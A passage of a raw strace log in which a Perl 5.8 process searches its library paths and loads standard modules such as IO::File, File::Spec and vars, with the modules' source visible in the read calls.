12710 07:43:45.418406 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
12710 07:43:45.418432 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12710 07:43:45.418458 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
12710 07:43:45.418473 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
12710 07:43:45.418565 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
12710 07:43:45.418583 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7de1000
12710 07:43:45.418614 mmap2(0xb7de4000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7de4000
12710 07:43:45.418631 close(8)          = 0
12710 07:43:45.418839 read(6, "", 4096) = 0
12710 07:43:45.418854 close(6)          = 0
12710 07:43:45.418886 stat64("/etc/perl/IO/File.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.429175 stat64("/etc/perl/IO/File.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.429175 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.429175 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.429175 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.429176 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.429176 stat64("/usr/lib/perl5/IO/File.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.429176 stat64("/usr/lib/perl5/IO/File.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.429186 stat64("/usr/share/perl5/IO/File.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.429199 stat64("/usr/share/perl5/IO/File.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.429212 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.429224 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
12710 07:43:45.429246 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
12710 07:43:45.429260 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eeb68) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.429272 _llseek(6, 0, [0], SEEK_CUR) = 0
12710 07:43:45.429291 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
12710 07:43:45.429635 stat64("/etc/perl/File/Spec.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439079 stat64("/etc/perl/File/Spec.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.439079 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439079 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.439079 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439079 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.439080 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439086 stat64("/usr/lib/perl5/File/Spec.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.439100 stat64("/usr/share/perl5/File/Spec.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439113 stat64("/usr/share/perl5/File/Spec.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.439131 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439144 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.439158 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439171 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
12710 07:43:45.439194 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
12710 07:43:45.439209 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee6b8) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.439221 _llseek(8, 0, [0], SEEK_CUR) = 0
12710 07:43:45.439241 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
12710 07:43:45.439323 stat64("/etc/perl/vars.pmc", 0xbf8ee4ec) = -1 ENOENT (No such file or directory)
12710 07:43:45.439336 stat64("/etc/perl/vars.pm", 0xbf8ee3fc) = -1 ENOENT (No such file or directory)
12710 07:43:45.439350 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbf8ee4ec) = -1 ENOENT (No such file or directory)
12710 07:43:45.439362 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbf8ee3fc) = -1 ENOENT (No such file or directory)
12710 07:43:45.439376 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbf8ee4ec) = -1 ENOENT (No such file or directory)
12710 07:43:45.439389 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbf8ee3fc) = -1 ENOENT (No such file or directory)
12710 07:43:45.439403 stat64("/usr/lib/perl5/vars.pmc", 0xbf8ee4ec) = -1 ENOENT (No such file or directory)
12710 07:43:45.439503 stat64("/usr/lib/perl5/vars.pm", 0xbf8ee3fc) = -1 ENOENT (No such file or directory)
12710 07:43:45.439517 stat64("/usr/share/perl5/vars.pmc", 0xbf8ee4ec) = -1 ENOENT (No such file or directory)
12710 07:43:45.439529 stat64("/usr/share/perl5/vars.pm", 0xbf8ee3fc) = -1 ENOENT (No such file or directory)
12710 07:43:45.439542 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbf8ee4ec) = -1 ENOENT (No such file or directory)
12710 07:43:45.439555 stat64("/usr/lib/perl/5.8/vars.pm", 0xbf8ee3fc) = -1 ENOENT (No such file or directory)
12710 07:43:45.439568 stat64("/usr/share/perl/5.8/vars.pmc", 0xbf8ee4ec) = -1 ENOENT (No such file or directory)
12710 07:43:45.439581 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
12710 07:43:45.439602 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
12710 07:43:45.439616 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee208) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.439627 _llseek(10, 0, [0], SEEK_CUR) = 0
12710 07:43:45.439645 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
12710 07:43:45.439764 stat64("/etc/perl/warnings/register.pmc", 0xbf8ee03c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439779 stat64("/etc/perl/warnings/register.pm", 0xbf8edf4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439793 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbf8ee03c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439806 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbf8edf4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439821 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbf8ee03c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439835 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbf8edf4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439849 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbf8ee03c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439862 stat64("/usr/lib/perl5/warnings/register.pm", 0xbf8edf4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439876 stat64("/usr/share/perl5/warnings/register.pmc", 0xbf8ee03c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439889 stat64("/usr/share/perl5/warnings/register.pm", 0xbf8edf4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439903 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbf8ee03c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439916 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbf8edf4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439930 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbf8ee03c) = -1 ENOENT (No such file or directory)
12710 07:43:45.439944 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
12710 07:43:45.439965 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
12710 07:43:45.440043 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8edd58) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.440057 _llseek(11, 0, [0], SEEK_CUR) = 0
12710 07:43:45.440077 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
12710 07:43:45.440229 read(11, "", 4096) = 0
12710 07:43:45.440242 close(11)         = 0
12710 07:43:45.440449 _llseek(10, 1148, [1148], SEEK_SET) = 0
12710 07:43:45.440465 _llseek(10, 0, [1148], SEEK_CUR) = 0
12710 07:43:45.440476 close(10)         = 0
12710 07:43:45.440559 _llseek(8, 594, [594], SEEK_SET) = 0
12710 07:43:45.440575 _llseek(8, 0, [594], SEEK_CUR) = 0
12710 07:43:45.440585 close(8)          = 0
12710 07:43:45.440619 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.440644 stat64("/etc/perl/File/Spec/Unix.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.440658 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.440676 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.440691 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.440704 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.440719 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.440732 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.440746 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.440758 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.440772 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.440786 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.440800 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.440814 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
12710 07:43:45.440836 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
12710 07:43:45.440851 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee6b8) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.440863 _llseek(8, 0, [0], SEEK_CUR) = 0
12710 07:43:45.440881 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
12710 07:43:45.441526 brk(0x8218000)    = 0x8218000
12710 07:43:45.441662 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
12710 07:43:45.441969 read(8, "", 4096) = 0
12710 07:43:45.441969 close(8)          = 0
12710 07:43:45.441969 read(6, "", 4096) = 0
12710 07:43:45.441974 close(6)          = 0
12710 07:43:45.442156 stat64("/etc/perl/IO/Pipe.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.442175 stat64("/etc/perl/IO/Pipe.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.442190 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.442203 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.442217 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.442230 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.442244 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.442256 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.442269 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.442281 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.442295 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.442307 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
12710 07:43:45.442329 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
12710 07:43:45.442344 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eeb68) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.442355 _llseek(6, 0, [0], SEEK_CUR) = 0
